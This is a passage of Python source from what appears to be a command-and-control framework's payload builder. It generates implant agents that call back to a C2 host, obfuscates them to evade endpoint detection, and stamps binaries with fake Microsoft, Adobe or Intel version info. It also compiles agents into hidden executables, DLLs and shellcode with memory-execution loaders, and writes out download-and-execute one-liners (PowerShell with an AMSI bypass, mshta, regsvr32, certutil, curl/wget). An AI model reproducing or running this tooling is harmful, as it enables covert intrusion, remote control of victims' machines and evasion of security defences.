        if transport in ('http', 'https'):
            content = content.replace("{{C2_SCHEME}}", transport)
            content = content.replace("{{VERIFY_SSL}}", "False" if transport == 'https' else "True")

        # Add OS-specific code
        os_specific = self.get_os_specific_code(target_os)

        # Insert OS-specific initialization after imports
        import_end = content.find('\nSERVER_HOST')
        if import_end > 0:
            content = content[:import_end] + '\n' + os_specific['init'] + content[import_end:]

        # Apply obfuscation if requested
        if obfuscate:
            content = self.obfuscate_strings(content)
            print(f"[*] Applied polymorphic obfuscation with EDR evasion")

        # Save agent
        jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
        mode_suffix = f"_beacon{beacon_interval}s{jitter_suffix}" if beacon_mode else "_stream"
        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
        agent_hash = hashlib.md5(content.encode()).hexdigest()[:6]
        os_suffix = f"_{target_os}"
        output_file = self.output_dir / f"agent_{agent_hash}{transport_suffix}{mode_suffix}{os_suffix}.py"
        with open(output_file, 'w') as f:
            f.write(content)

        # Make executable
        os.chmod(output_file, 0o755)

        print(f"[*] Agent customized for {target_os.upper()} with platform-specific features")
        return str(output_file)

    def generate_powershell_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                                   transport: str = 'websocket', beacon_interval: int = 60,
                                   beacon_jitter: int = 0) -> str:
        """Generate PowerShell agent"""
        if transport in ('http', 'https'):
            template_path = self.templates_dir / "agent_http_template.ps1"
        else:
            template_path = self.templates_dir / "agent_template.ps1"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        if transport in ('http', 'https'):
            content = content.replace("{{C2_SCHEME}}", transport)
            content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # Apply polymorphic obfuscation
        content = self.obfuscate_powershell(content)

        # Save agent
        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.ps1"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                                    transport: str = 'websocket', beacon_mode: bool = False,
                                    beacon_interval: int = 60, beacon_jitter: int = 0) -> str:
        """Generate JavaScript (Node.js) agent"""
        if transport in ('http', 'https'):
            template_path = self.templates_dir / "agent_http_template.js"
        else:
            template_path = self.templates_dir / "agent_template.js"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        if transport in ('http', 'https'):
            content = content.replace("{{C2_SCHEME}}", transport)
            content = content.replace("{{VERIFY_SSL}}", "false" if transport == 'https' else "true")
            content = content.replace("{{BEACON_MODE}}", "true" if beacon_mode else "false")
            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # Apply polymorphic obfuscation
        content = self.obfuscate_javascript(content)

        # Save agent
        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.js"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                            transport: str = 'websocket', beacon_interval: int = 60,
                            beacon_jitter: int = 0) -> str:
        """Generate HTA agent"""
        if transport in ('http', 'https'):
            template_path = self.templates_dir / "agent_http_template.hta"
        else:
            template_path = self.templates_dir / "agent_template.hta"

        if not template_path.exists():
            raise FileNotFoundError(f"Template not found: {template_path}")

        with open(template_path, 'r') as f:
            content = f.read()

        # Replace placeholders
        content = content.replace("{{C2_HOST}}", c2_host)
        content = content.replace("{{C2_PORT}}", str(c2_port))
        content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)

        if transport in ('http', 'https'):
            content = content.replace("{{C2_SCHEME}}", transport)
            content = content.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
            content = content.replace("{{BEACON_JITTER}}", str(beacon_jitter))

        # Apply polymorphic obfuscation
        content = self.obfuscate_hta(content)

        # Save agent
        transport_suffix = f"_{transport}" if transport != 'websocket' else ""
        output_file = self.output_dir / f"agent_{self.random_string(6)}{transport_suffix}.hta"
        with open(output_file, 'w') as f:
            f.write(content)

        return str(output_file)

    def generate_fake_version_info(self) -> str:
        """Generate fake Windows version info for legitimacy"""
        fake_companies = ['Microsoft Corporation', 'Adobe Systems Inc', 'Oracle Corporation',
                         'Intel Corporation', 'NVIDIA Corporation', 'Dell Inc']
        fake_products = ['System Service', 'Update Manager', 'Configuration Tool',
                        'Helper Service', 'Background Task', 'Sync Service']

        version_template = f'''VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, {random.randint(0, 20)}, {random.randint(0, 9999)}, 0),
    prodvers=(1, {random.randint(0, 20)}, {random.randint(0, 9999)}, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{random.choice(fake_companies)}'),
        StringStruct(u'FileDescription', u'{random.choice(fake_products)}'),
        StringStruct(u'FileVersion', u'1.{random.randint(0, 20)}.{random.randint(0, 9999)}.0'),
        StringStruct(u'InternalName', u'{self.random_string(8)}'),
        StringStruct(u'LegalCopyright', u'Copyright {random.randint(2020, 2026)}'),
        StringStruct(u'OriginalFilename', u'{self.random_string(8)}.exe'),
        StringStruct(u'ProductName', u'{random.choice(fake_products)}'),
        StringStruct(u'ProductVersion', u'1.{random.randint(0, 20)}.{random.randint(0, 9999)}.0')])
      ]),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
        return version_template

    def compile_to_dll(self, python_file: str, arch: str = 'x64', upx: bool = True,
                       export_name: str = None) -> str:
        """Compile Python agent to DLL for DLL injection/hijacking

        NOTE: PyInstaller does not natively produce valid DLLs. This generates
        a PyInstaller executable renamed to .dll with a rundll32-compatible
        wrapper script. For true DLL output, compile on Windows with py2exe
        or use a C loader DLL that embeds the Python agent.

        Args:
            python_file: Path to Python file to compile
            arch: Target architecture (x86, x64)
            upx: Use UPX compression
            export_name: Custom export function name (default: random)
        """
        try:
            import PyInstaller.__main__

            output_name = Path(python_file).stem
            unique_name = f"{self.random_string(8)}"
            export_func = export_name or self.random_string(6)

            # Only Windows supports DLL compilation
            if sys.platform != 'win32':
                print(f"[!] DLL compilation requires Windows (current: {sys.platform})")
                print(f"[!] PyInstaller cannot produce valid DLLs natively")
                print(f"[*] Generating DLL wrapper source and spec for compilation on Windows...")
                # Generate the wrapper source for later compilation on Windows
                wrapper_path = self.output_dir / f"{unique_name}_dll_wrapper.py"
                with open(python_file, 'r') as f:
                    agent_code = f.read()
                wrapper_code = f'''# DLL Wrapper - Compile on Windows with: pyinstaller --onefile {wrapper_path.name}
# Then rename .exe to .dll for rundll32 usage
# For true DLL: use py2exe or a C loader
{agent_code}
'''
                with open(wrapper_path, 'w') as f:
                    f.write(wrapper_code)
                print(f"[*] DLL wrapper saved: {wrapper_path}")
                print(f"[*] To compile: transfer to Windows and run PyInstaller")
                return str(wrapper_path)

            dll_path = self.output_dir / f"{unique_name}_{arch}.dll"

            # Create DLL hook script
            hook_script = self.output_dir / 'build' / f'dll_hook_{unique_name}.py'
            hook_script.parent.mkdir(exist_ok=True, parents=True)

            hook_content = f'''
import ctypes
import threading

def {export_func}():
    """DLL export function"""
    threading.Thread(target=_main, daemon=True).start()
    return 1

def DllMain(hinstDLL, fdwReason, lpvReserved):
    """DLL entry point"""
    if fdwReason == 1:  # DLL_PROCESS_ATTACH
        threading.Thread(target=_main, daemon=True).start()
    return True

def _main():
    """Main agent execution"""
    import sys
    sys.path.insert(0, '')
    try:
        from {output_name} import connect_to_server
        import asyncio
        asyncio.run(connect_to_server())
    except Exception as e:
        pass
'''
            with open(hook_script, 'w') as f:
                f.write(hook_content)

            # Generate fake version info
            version_file = self.output_dir / 'build' / f'version_{unique_name}.txt'
            with open(version_file, 'w') as f:
                f.write(self.generate_fake_version_info())

            # Build PyInstaller arguments for DLL
            args = [
                str(hook_script),
                '--onefile',
                '--clean',
                f'--distpath={self.output_dir}',
                '--name', unique_name + '_' + arch,
                '--specpath', str(self.output_dir / 'build'),
                '--workpath', str(self.output_dir / 'build'),
                '--strip',
                '--disable-windowed-traceback',
            ]

            # Add hidden imports
            args.extend([
                '--hidden-import', 'asyncio',
                '--hidden-import', 'websockets',
            ])

            # For DLL, we need to modify the spec file after initial creation
            if sys.platform == 'win32':
                # On Windows, compile as DLL
                args.extend([
                    '--noconsole',
                ])

            if upx:
                args.append('--upx-dir=.')
                print(f"[*] Enabling UPX compression for entropy")
            else:
                args.append('--noupx')

            if version_file.exists():
                args.extend(['--version-file', str(version_file)])

            print(f"[*] Compiling polymorphic DLL for {arch}...")
            print(f"[*] Export function: {export_func}")
            print(f"[*] Output name: {unique_name}_{arch}")

            # Run PyInstaller
            PyInstaller.__main__.run(args)

            # Rename .exe to .dll if on Windows
            exe_path = self.output_dir / f"{unique_name}_{arch}.exe"
            if exe_path.exists():
                exe_path.rename(dll_path)
                print(f"[+] Compiled DLL: {dll_path.name}")
            else:
                print(f"[!] Warning: Expected executable not found, check build output")
                return f"DLL compilation completed but file not found at expected path"

            # Clean up build artifacts
            build_dir = self.output_dir / 'build'
            if build_dir.exists():
                shutil.rmtree(build_dir)

            if dll_path.exists():
                file_size = dll_path.stat().st_size / 1024 / 1024  # MB
                file_hash = hashlib.sha256(open(dll_path, 'rb').read()).hexdigest()[:16]
                print(f"[+] DLL Size: {file_size:.2f} MB")
                print(f"[+] SHA256 (partial): {file_hash}")
                print(f"[*] Export: {export_func}()")
                print(f"[*] Usage: rundll32.exe {dll_path.name},{export_func}")
                return str(dll_path)
            else:
                return "DLL compilation failed"

        except ImportError:
            return "PyInstaller not installed. Install with: pip install pyinstaller"
        except Exception as e:
            return f"DLL compilation error: {str(e)}"

    def compile_to_exe(self, python_file: str, arch: str = 'x64', upx: bool = True,
                       add_data: list = None, icon: str = None) -> str:
        """Compile Python agent to executable with EDR evasion

        Args:
            python_file: Path to Python file to compile
            arch: Target architecture (x86, x64, arm64)
            upx: Use UPX compression (adds entropy)
            add_data: Additional data files to include
            icon: Path to icon file (.ico)
        """
        try:
            import PyInstaller.__main__

            output_name = Path(python_file).stem
            unique_name = f"{self.random_string(8)}"

            # Determine extension based on platform
            if sys.platform == 'win32':
                exe_path = self.output_dir / f"{unique_name}_{arch}.exe"
            elif sys.platform == 'darwin':
                exe_path = self.output_dir / f"{unique_name}_{arch}_macos"
            else:
                exe_path = self.output_dir / f"{unique_name}_{arch}_linux"

            # Generate fake version info for Windows
            version_file = None
            if sys.platform == 'win32':
                version_file = self.output_dir / 'build' / f'version_{unique_name}.txt'
                version_file.parent.mkdir(exist_ok=True, parents=True)
                with open(version_file, 'w') as f:
                    f.write(self.generate_fake_version_info())

            # Build PyInstaller arguments with EDR evasion
            args = [
                python_file,
                '--onefile',
                '--noconsole',  # No console window
                '--clean',
                f'--distpath={self.output_dir}',
                '--name', unique_name + '_' + arch,
                '--specpath', str(self.output_dir / 'build'),
                '--workpath', str(self.output_dir / 'build'),
                '--strip',  # Strip debug symbols
                '--disable-windowed-traceback',  # Disable traceback
            ]

            # Add UPX compression (adds entropy, helps evade some signatures)
            if upx:
                args.append('--upx-dir=.')
                print(f"[*] Enabling UPX compression for entropy")
            else:
                args.append('--noupx')

            # Add version file for legitimacy
            if version_file and version_file.exists():
                args.extend(['--version-file', str(version_file)])
                print(f"[*] Added fake version info for legitimacy")

            # Add icon if provided
            if icon and os.path.exists(icon):
                args.extend(['--icon', icon])

            # Add additional data files
            if add_data:
                for data in add_data:
                    args.extend(['--add-data', data])

            # Add runtime hooks to avoid static analysis
            args.extend([
                '--runtime-tmpdir', '.',  # Use current dir for runtime
            ])

            # Cross-compilation warning
            current_platform = sys.platform
            if current_platform != 'win32' and (python_file.endswith('_windows.py') or 'windows' in python_file):
                print(f"[!] Warning: Cross-compilation not supported by PyInstaller")
                print(f"[!] Current platform: {current_platform}. Executable will only run on {current_platform}")
                print(f"[*] For Windows EXE, compile the Python source on a Windows machine")
            elif current_platform == 'win32' and ('linux' in python_file or 'macos' in python_file):
                print(f"[!] Warning: Cross-compilation not supported by PyInstaller")
                print(f"[*] For Linux/macOS binaries, compile on the target platform")

            # Architecture-specific notes
            if arch == 'x86':
                print(f"[*] Compiling for x86 (32-bit)")
            elif arch == 'arm64':
                print(f"[*] Compiling for ARM64")

            print(f"[*] Compiling polymorphic executable for {arch}...")
            print(f"[*] Output name: {unique_name}_{arch}")
            PyInstaller.__main__.run(args)

            # Clean up build artifacts
            build_dir = self.output_dir / 'build'
            if build_dir.exists():
                shutil.rmtree(build_dir)

            # Check if output exists
            if exe_path.exists():
                file_size = exe_path.stat().st_size / 1024 / 1024  # MB
                file_hash = hashlib.sha256(open(exe_path, 'rb').read()).hexdigest()[:16]
                print(f"[+] Compiled: {exe_path.name} ({file_size:.2f} MB)")
                print(f"[+] SHA256 (partial): {file_hash}")
                print(f"[*] Polymorphic agent with unique binary signature")
                return str(exe_path)
            else:
                return f"Compilation completed but output not found at expected path"

        except ImportError:
            return "PyInstaller not installed. Install with: pip install pyinstaller"
        except Exception as e:
            return f"Compilation error: {str(e)}"

    def generate_shellcode(self, python_file: str, arch: str = 'x64', format: str = 'raw') -> str:
        """Generate position-independent shellcode from Python agent

        Args:
            python_file: Path to Python file
            arch: Target architecture (x86, x64)
            format: Output format ('raw', 'c', 'python', 'powershell')
        """
        try:
            # First compile to executable
            exe_path = self.compile_to_exe(python_file, arch=arch, upx=False)

            if not exe_path or exe_path.startswith('Error'):
                return "Failed to compile agent for shellcode generation"

            exe_file = Path(exe_path)
            if not exe_file.exists():
                return "Compiled executable not found"

            # Read the compiled executable
            with open(exe_file, 'rb') as f:
                exe_data = f.read()

            # Generate shellcode stub based on format
            unique_name = self.random_string(8)

            if format == 'raw':
                # Raw binary format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.bin"

                # Create a simple shellcode loader stub
                # This is a simplified version - full implementation would use donut, sgn, etc.
                shellcode = self._create_shellcode_stub(exe_data, arch)

                with open(shellcode_file, 'wb') as f:
                    f.write(shellcode)

                print(f"[+] Raw shellcode: {shellcode_file.name} ({len(shellcode)} bytes)")

            elif format == 'c':
                # C array format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.c"
                c_array = self._generate_c_array(exe_data, f"shellcode_{arch}")

                with open(shellcode_file, 'w') as f:
                    f.write(c_array)

                print(f"[+] C array shellcode: {shellcode_file.name}")

            elif format == 'python':
                # Python bytearray format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.py"
                py_array = self._generate_python_array(exe_data)

                with open(shellcode_file, 'w') as f:
                    f.write(py_array)

                print(f"[+] Python shellcode: {shellcode_file.name}")

            elif format == 'powershell':
                # PowerShell byte array format
                shellcode_file = self.output_dir / f"shellcode_{unique_name}_{arch}.ps1"
                ps_array = self._generate_powershell_array(exe_data)

                with open(shellcode_file, 'w') as f:
                    f.write(ps_array)

                print(f"[+] PowerShell shellcode: {shellcode_file.name}")

            file_hash = hashlib.sha256(open(shellcode_file, 'rb').read()).hexdigest()[:16]
            print(f"[+] SHA256 (partial): {file_hash}")
            print(f"[*] Shellcode format: {format}")

            return str(shellcode_file)

        except Exception as e:
            return f"Shellcode generation error: {str(e)}"

    def _create_shellcode_stub(self, exe_data: bytes, arch: str) -> bytes:
        """Create position-independent shellcode stub"""
        # This creates a basic reflective loader stub
        # In production, use tools like Donut, sgn, or sRDI for proper shellcode conversion

        if arch == 'x64':
            # x64 shellcode stub (simplified)
            stub = bytes([
                0x48, 0x83, 0xEC, 0x28,  # sub rsp, 0x28
                0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,  # lea rcx, [payload]
            ])
        else:
            # x86 shellcode stub (simplified)
            stub = bytes([
                0x55,  # push ebp
                0x89, 0xE5,  # mov ebp, esp
            ])

        # Append compressed exe data
        import zlib
        compressed = zlib.compress(exe_data, level=9)

        return stub + compressed

    def _generate_c_array(self, data: bytes, var_name: str) -> str:
        """Generate C array format"""
        hex_bytes = ', '.join([f'0x{b:02x}' for b in data])
        return f'''unsigned char {var_name}[] = {{
    {hex_bytes}
}};
unsigned int {var_name}_len = {len(data)};
'''

    def _generate_python_array(self, data: bytes) -> str:
        """Generate Python bytearray format"""
        hex_bytes = ', '.join([f'0x{b:02x}' for b in data])
        return f'''shellcode = bytearray([
    {hex_bytes}
])

# Usage:
# import ctypes
# ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
# ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
'''

    def _generate_powershell_array(self, data: bytes) -> str:
        """Generate PowerShell byte array format"""
        hex_bytes = ','.join([f'0x{b:02x}' for b in data])
        return f'''$shellcode = @({hex_bytes})

# Usage:
# $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
# [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $ptr, $shellcode.Length)
# [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Type]::GetType("System.Action")).Invoke()
'''

    def generate_oneliners(self, payload_url: str, output_file: str = None) -> dict:
        """Generate one-liner payloads for various delivery mechanisms

        Args:
            payload_url: URL where the payload is hosted (http://server/agent.exe)
            output_file: Optional file to write one-liners to
        """
        oneliners = {}

        # PowerShell download and execute
        ps_oneliner = f'powershell -w hidden -enc {self._encode_powershell_command(f"IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")}'
        oneliners['powershell'] = ps_oneliner

        # PowerShell with AMSI bypass
        amsi_bypass = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name-like'*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name-like'*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);"
        ps_amsi = f'powershell -w hidden -enc {self._encode_powershell_command(amsi_bypass + f"IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")}'
        oneliners['powershell_amsi_bypass'] = ps_amsi

        # MSHTA
        mshta_oneliner = f'mshta.exe javascript:a=GetObject("script:{payload_url}").Exec();close()'
        oneliners['mshta'] = mshta_oneliner

        # MSHTA with download
        mshta_dl = f'mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"":window.close")'
        oneliners['mshta_download'] = mshta_dl

        # WScript/CScript
        wscript_code = f'Set o=CreateObject("WScript.Shell"):o.Run "powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')",0'
        oneliners['wscript'] = f'echo {wscript_code} > %temp%\\r.vbs && wscript //nologo %temp%\\r.vbs'

        # Rundll32 with JavaScript
        rundll32_js = f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')")'
        oneliners['rundll32'] = rundll32_js

        # CertUtil download and execute
        certutil = f'certutil -urlcache -split -f {payload_url} %temp%\\p.exe && %temp%\\p.exe'
        oneliners['certutil'] = certutil

        # BITSAdmin download and execute
        bitsadmin = f'bitsadmin /transfer job {payload_url} %temp%\\p.exe && %temp%\\p.exe'
        oneliners['bitsadmin'] = bitsadmin

        # SMB/UNC path
        smb_path = payload_url.replace('http://', '\\\\').replace('https://', '\\\\').replace('/', '\\')
        oneliners['smb'] = f'{smb_path}'

        # Regsvr32 (Squiblydoo)
        regsvr32 = f'regsvr32 /s /n /u /i:{payload_url} scrobj.dll'
        oneliners['regsvr32'] = regsvr32

        # MSIEXEC
        msiexec = f'msiexec /q /i {payload_url}'
        oneliners['msiexec'] = msiexec

        # Curl (Windows 10+)
        curl = f'curl -o %temp%\\p.exe {payload_url} && %temp%\\p.exe'
        oneliners['curl'] = curl

        # Linux one-liners
        wget_linux = f'wget -q -O /tmp/p {payload_url} && chmod +x /tmp/p && /tmp/p'
        oneliners['wget_linux'] = wget_linux

        curl_linux = f'curl -s -o /tmp/p {payload_url} && chmod +x /tmp/p && /tmp/p'
        oneliners['curl_linux'] = curl_linux

        # Python one-liner
        python_oneliner = f'python -c "import urllib.request;exec(urllib.request.urlopen(\'{payload_url}\').read())"'
        oneliners['python'] = python_oneliner

        # Save to file if requested
        if output_file:
            output_path = self.output_dir / output_file
            with open(output_path, 'w') as f:
                f.write("# One-Liner Payloads\n")
                f.write(f"# Payload URL: {payload_url}\n\n")
                for name, oneliner in oneliners.items():
                    f.write(f"## {name}\n")
                    f.write(f"{oneliner}\n\n")
            print(f"[+] One-liners saved to: {output_path}")

        return oneliners

    def _encode_powershell_command(self, command: str) -> str:
        """Encode PowerShell command to base64"""
        import base64
        # PowerShell expects UTF-16LE encoding
        encoded = base64.b64encode(command.encode('utf-16le')).decode()
        return encoded

    def compile_multi_arch(self, python_file: str, architectures: list = None, upx: bool = True) -> dict:
        """Compile for multiple architectures

        Args:
            python_file: Path to Python file
            architectures: List of architectures ['x86', 'x64', 'arm64']
            upx: Use UPX compression

        Returns:
            dict: Architecture -> compiled file path
        """
        if architectures is None:
            architectures = ['x64']  # Default to x64

        results = {}

        for arch in architectures:
            print(f"\n[*] Compiling for {arch}...")
            result = self.compile_to_exe(python_file, arch=arch, upx=upx)
            results[arch] = result

        return results

    def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                     beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                     compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                     shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = True,
                     generate_bin: bool = False, raw_shellcode: bool = False,
                     transport: str = 'websocket') -> dict:
        """Generate agents for all platforms

        Args:
            c2_host: Server host
            c2_port: Server port
            encryption_key: Encryption key
            beacon_mode: Enable beacon mode
            beacon_interval: Beacon interval in seconds
            beacon_jitter: Jitter percentage (0-100) for beacon sleep times
            compile_exe: Compile Python agent to executable
            compile_dll: Compile Python agent to DLL (Windows only)
            generate_shellcode: Generate shellcode from agent
            shellcode_format: Shellcode format ('raw', 'c', 'python', 'powershell')
            architectures: List of architectures for compilation ['x86', 'x64', 'arm64']
            upx: Use UPX compression
            icon: Path to icon file for executables
            target_os: Target OS ('windows', 'linux', 'macos', 'auto')
            generate_multi_os: Generate agents for all OS types
        """
        results = {}
        self.generated_keys = []  # Track all unique keys for server registration

        # If multi-OS requested, generate for all platforms
        if generate_multi_os:
            os_list = ['windows', 'linux', 'macos']
            print(f"[*] Generating polymorphic agents for multiple operating systems")
        else:
            os_list = [target_os]

        # Generate Python agents for each OS (each gets its own unique key)
        for os_type in os_list:
            try:
                os_key = f'python_{os_type}' if generate_multi_os else 'python'
                results[os_key] = self.generate_python_agent(
                    c2_host, c2_port, encryption_key,
                    beacon_mode, beacon_interval, beacon_jitter,
                    unique_key=unique_key, target_os=os_type, transport=transport
                )
                if beacon_mode:
                    jitter_desc = f" ±{beacon_jitter}%" if beacon_jitter > 0 else ""
                    mode_desc = f"beacon ({beacon_interval}s{jitter_desc})"
                else:
                    mode_desc = "streaming"
                print(f"[+] Python agent generated ({mode_desc}, {os_type}): {results[os_key]}")
            except Exception as e:
                results[os_key] = f"Error: {str(e)}"
                print(f"[-] Python agent failed ({os_type}): {str(e)}")

        # Generate unique keys for PS/JS/HTA agents too
        ps_key = self.generate_unique_encryption_key() if unique_key else encryption_key
        if unique_key:
            self.generated_keys.append(ps_key)
        try:
            results['powershell'] = self.generate_powershell_agent(c2_host, c2_port, ps_key,
                                                                     transport=transport, beacon_interval=beacon_interval,
                                                                     beacon_jitter=beacon_jitter)
            print(f"[+] PowerShell agent generated: {results['powershell']}")
        except Exception as e:
            results['powershell'] = f"Error: {str(e)}"
            print(f"[-] PowerShell agent failed: {str(e)}")

        js_key = self.generate_unique_encryption_key() if unique_key else encryption_key
        if unique_key:
            self.generated_keys.append(js_key)
        try:
            results['javascript'] = self.generate_javascript_agent(c2_host, c2_port, js_key,
                                                                     transport=transport, beacon_mode=beacon_mode,
                                                                     beacon_interval=beacon_interval, beacon_jitter=beacon_jitter)
            print(f"[+] JavaScript agent generated: {results['javascript']}")
        except Exception as e:
            results['javascript'] = f"Error: {str(e)}"
            print(f"[-] JavaScript agent failed: {str(e)}")

        hta_key = self.generate_unique_encryption_key() if unique_key else encryption_key
        if unique_key:
            self.generated_keys.append(hta_key)
        try:
            results['hta'] = self.generate_hta_agent(c2_host, c2_port, hta_key,
                                                         transport=transport, beacon_interval=beacon_interval,
                                                         beacon_jitter=beacon_jitter)
            print(f"[+] HTA agent generated: {results['hta']}")
        except Exception as e:
            results['hta'] = f"Error: {str(e)}"
            print(f"[-] HTA agent failed: {str(e)}")

        # Generate raw .bin payloads for external packers
        if generate_bin:
            type_map = {'powershell': 0x01, 'javascript': 0x02, 'hta': 0x03}
            for key, path in list(results.items()):
                if isinstance(path, str) and path.startswith('Error'):
                    continue
                if key.startswith('python'):
                    ptype = 0x04
                elif key in type_map:
                    ptype = type_map[key]
                else:
                    continue
                try:
                    bin_path = self.generate_bin_payload(path, ptype)
                    results[f'bin_{key}'] = bin_path
                    print(f"[+] Binary payload generated: {bin_path}")
                except Exception as e:
                    results[f'bin_{key}'] = f"Error: {str(e)}"
                    print(f"[-] Binary payload failed for {key}: {str(e)}")

        # Generate self-decoding shellcode blobs
        if raw_shellcode:
            type_map = {'powershell': 0x01, 'javascript': 0x02, 'hta': 0x03}
            sc_arch = architectures[0] if architectures else 'x64'
            for key, path in list(results.items()):
                if isinstance(path, str) and path.startswith('Error'):
                    continue
                if key.startswith('bin_'):
                    continue
                if key.startswith('python'):
                    ptype = 0x04
                elif key in type_map:
                    ptype = type_map[key]
                else:
                    continue
                try:
                    sc_path = self.generate_raw_shellcode_blob(path, ptype, arch=sc_arch)
                    results[f'sc_{key}'] = sc_path
                    print(f"[+] Shellcode blob generated ({sc_arch}): {sc_path}")
                except Exception as e:
                    results[f'sc_{key}'] = f"Error: {str(e)}"
                    print(f"[-] Shellcode blob failed for {key}: {str(e)}")

        # Compile Python agents to executables
        if compile_exe:
            # Find all Python agents to compile
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                print(f"\n[*] Compiling {agent_key} agent...")

                if architectures and len(architectures) > 1:
                    # Multi-architecture compilation
                    print(f"[*] Target architectures: {', '.join(architectures)}")
                    compiled = self.compile_multi_arch(agent_path, architectures, upx)
                    for arch, path in compiled.items():
                        exe_key = f'exe_{arch}_{os_suffix}' if generate_multi_os else f'exe_{arch}'
                        results[exe_key] = path
                        if not path.startswith('Error'):
                            print(f"[+] {arch.upper()} executable generated: {path}")
                else:
                    # Single architecture compilation
                    arch = architectures[0] if architectures else 'x64'
                    exe_key = f'exe_{arch}_{os_suffix}' if generate_multi_os else f'exe_{arch}'
                    results[exe_key] = self.compile_to_exe(agent_path, arch=arch, upx=upx, icon=icon)
                    if not results[exe_key].startswith('Error'):
                        print(f"[+] {arch.upper()} executable generated: {results[exe_key]}")
                    else:
                        print(f"[-] EXE compilation failed: {results[exe_key]}")

        # Compile Python agents to DLLs (Windows only)
        if compile_dll:
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                # Only compile Windows agents to DLL
                if 'windows' in agent_key or target_os == 'windows':
                    os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                    print(f"\n[*] Compiling {agent_key} agent to DLL...")

                    for arch in (architectures or ['x64']):
                        if arch not in ['x86', 'x64']:
                            continue  # DLLs only support x86/x64

                        dll_key = f'dll_{arch}_{os_suffix}' if generate_multi_os else f'dll_{arch}'
                        results[dll_key] = self.compile_to_dll(agent_path, arch=arch, upx=upx)
                        if not results[dll_key].startswith('Error'):
                            print(f"[+] {arch.upper()} DLL generated: {results[dll_key]}")
                        else:
                            print(f"[-] DLL compilation failed: {results[dll_key]}")

        # Generate shellcode from Python agents
        if generate_shellcode:
            python_agents = {k: v for k, v in results.items() if k.startswith('python') and not v.startswith('Error')}

            for agent_key, agent_path in python_agents.items():
                # Only generate shellcode for Windows agents
                if 'windows' in agent_key or target_os == 'windows':
                    os_suffix = agent_key.replace('python_', '') if '_' in agent_key else target_os
                    print(f"\n[*] Generating shellcode from {agent_key} agent...")

                    for arch in (architectures or ['x64']):
                        if arch not in ['x86', 'x64']:
